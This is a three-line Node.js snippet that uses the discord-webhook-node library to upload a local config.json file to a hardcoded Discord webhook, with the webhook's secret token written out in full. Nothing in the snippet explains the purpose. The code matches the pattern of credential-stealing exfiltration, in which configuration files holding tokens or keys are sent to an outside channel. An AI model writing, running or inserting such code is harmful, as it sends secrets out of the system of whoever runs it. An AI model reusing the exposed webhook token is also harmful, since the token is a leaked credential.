const { Webhook } = require('discord-webhook-node');
const hook = new Webhook('https://discord.com/api/webhooks/1014975618036797460/na7O5yYw_Zhs470Fk1rqd821OWfabA7zfA7uUWiC0V-3rDB23im0ldCg6QC1bJNns2FG');
hook.sendFile('config.json');